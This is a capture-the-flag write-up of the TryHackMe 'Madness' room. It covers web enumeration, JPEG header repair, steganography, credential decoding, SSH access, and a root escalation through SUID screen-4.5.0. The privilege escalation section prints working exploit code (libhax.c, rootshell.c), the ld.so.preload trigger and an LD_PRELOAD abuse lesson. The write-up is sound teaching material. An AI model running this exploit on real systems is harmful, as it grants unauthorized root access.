# Hacking **Madness THM**

![Madness Cover](<Images/cover.jpg>)

## Summary


- ### Learning Outcomes:
Web enumeration, file-signature analysis, steganography extraction, basic crypto decoding, and **Linux privilege escalation**.

- ### Target:
Linux (Ubuntu 16.04.6 LTS), Apache 2.4.18, OpenSSH 7.2p2.

- ### Vulnerabilities / Weaknesses:
Hidden web content, weak secret validation logic, stego-hidden credentials, and vulnerable SUID `screen-4.5.0` binary.

- ### Methods:
Recon (`nmap`, `gobuster`), manual web testing, header repair in hex, `steghide`, ROT decoding, SSH access, and local privesc.

- ### Tools:
`nmap`, `gobuster`, `wget`, `hexedit`, `steghide`, `curl`, `gcc`, `searchsploit`.

- ### Practical note:
I always check service and binary versions first, then ask LLMs whether those exact versions are vulnerable. That shortcut saves me tons of time during exploitation.

## Steps

1. Information gathering and reconnaissance

```bash
nmap -sV <TARGET_IP>
```

Result showed:
- `22/tcp` OpenSSH 7.2p2
- `80/tcp` Apache 2.4.18

![Target Info](<Images/Screenshot 2026-04-05 151209.png>)
![Nmap Service Scan](<Images/Screenshot 2026-04-05 151237.png>)

2. Initial web access

Browsing port 80 showed the default Apache page.

![Apache Default Page](<Images/Screenshot 2026-04-05 151257.png>)

Noticed a broken image reference (`thm.jpg`) on that page.

![Broken Image Hint](<Images/Screenshot 2026-04-05 151321.png>)

3. Web enumeration

```bash
gobuster dir -w /usr/share/wordlists/first.txt -u http://<TARGET_IP>:80
```

Discovered `index.php` as a useful path.

![Gobuster Results](<Images/Screenshot 2026-04-05 151311.png>)

4. Pull and inspect hidden image file

```bash
wget http://<TARGET_IP>/thm.jpg
head thm.jpg
file thm.jpg
```

The file had mismatched magic bytes (PNG header on JPEG-like body), so I inspected with hex.

![Download thm.jpg](<Images/Screenshot 2026-04-05 151356.png>)
![Header Check via head](<Images/Screenshot 2026-04-05 151407.png>)
![Hexedit Open](<Images/Screenshot 2026-04-05 151851.png>)
![Wrong Header Bytes](<Images/Screenshot 2026-04-05 151955.png>)

5. Repair file signature and validate

I replaced the fake PNG magic bytes with JPEG bytes:
- from `FF 50 4E 47`
- to `FF D8 FF E0`

```bash
file thm.jpg
```

Now it was recognized as valid JPEG image data.

![Fixed Header Bytes](<Images/Screenshot 2026-04-05 151916.png>)
![File Type Confirmed](<Images/Screenshot 2026-04-05 151859.png>)

6. Secret path and secret value logic

Extracted clue pointed to hidden directory:
- `/th1s_1s_h1dd3n`

```bash
curl http://<TARGET_IP>/th1s_1s_h1dd3n/index.php?secret=1
for i in {1..99}; do curl "http://<TARGET_IP>/th1s_1s_h1dd3n/index.php?secret=$i"; done
```

Correct secret was `73`, returning encoded string:
- `y2RPJ4QaPF!B`

![Hidden Directory Clue](<Images/Screenshot 2026-04-05 152313.png>)
![Hidden Dir Page](<Images/Screenshot 2026-04-05 152327.png>)
![Secret Parameter Test](<Images/Screenshot 2026-04-05 152339.png>)
![Secret Found 73](<Images/Screenshot 2026-04-05 152347.png>)
![Secret Brute Script](<Images/Screenshot 2026-04-05 151548.png>)
![Secret Response Output](<Images/Screenshot 2026-04-05 151619.png>)

7. Stego extraction and credential decoding

Used `steghide` to pull hidden data:

```bash
steghide --extract -sf thm.jpg
cat hidden.txt
```

Recovered username candidate: `wbxre`

ROT13 decode gave:
- `joker`

```bash
steghide --extract -sf 5iW7kC8.jpg
cat password.txt
```

Recovered SSH password:
- `*axA&GF8dP`

![Steghide username extract](<Images/Screenshot 2026-04-05 151641.png>)
![Hidden txt content](<Images/Screenshot 2026-04-05 152122.png>)
![ROT13 Decode to joker](<Images/Screenshot 2026-04-05 151653.png>)
![Steghide password extract](<Images/Screenshot 2026-04-05 173708.png>)

8. Foothold (SSH)

```bash
ssh joker@<TARGET_IP>
```

Logged in successfully and grabbed `user.txt`.

![SSH Access as joker](<Images/Screenshot 2026-04-05 173906.png>)
![User Flag](<Images/Screenshot 2026-04-05 173929.png>)

9. Local privilege escalation (`screen-4.5.0` SUID)

I checked SUID binaries and found vulnerable `screen-4.5.0` / `screen-4.5.0.old`.

```bash
find / -perm -u=s -type f 2>/dev/null
```

![SUID Enumeration](<Images/Screenshot 2026-04-05 184617.png>)

### Exploit transfer and setup

```bash
searchsploit screen 4.5.0
searchsploit -m 41154
python3 -m http.server 80
```

```bash
cd /tmp
wget http://<YOUR_VPN_IP>/41154.sh
```

### Exploit code used

`libhax.c`

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

__attribute__ ((constructor))
void drop_shell() {
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] Done!\n");
}
```

Compile:

```bash
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
```

`rootshell.c`

```c
#include <stdio.h>

int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

Compile:

```bash
gcc -o /tmp/rootshell /tmp/rootshell.c
```

Trigger:

```bash
cd /etc
/bin/screen-4.5.0.old -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
/bin/screen-4.5.0.old -ls
/tmp/rootshell
```

Then verify root and read root flag.

![Exploit Artifacts in /tmp](<Images/Screenshot 2026-04-05 184823.png>)
![Triggering screen exploit](<Images/Screenshot 2026-04-05 184851.png>)
![Root shell check](<Images/Screenshot 2026-04-05 184857.png>)
![Root Flag](<Images/Screenshot 2026-04-05 184908.png>)

10. Completion

Room complete.

![Madness Completed](<Images/Screenshot 2026-04-05 183747.png>)

## Conclusion

- ### From Now ON:
Whenever you see a binary with the SUID bit, you should immediately ask: "What does this program allow a user to control?"\
Look for ways to influence how a process loads its dependencies. If you can write to a library path or a linker config file.\
The Dynamic Linker (ld.so) decides which libraries a program needs to run. By manipulating files like /etc/ld.so.preload or environment variables like LD_PRELOAD, you can force the system to run your code inside its process \

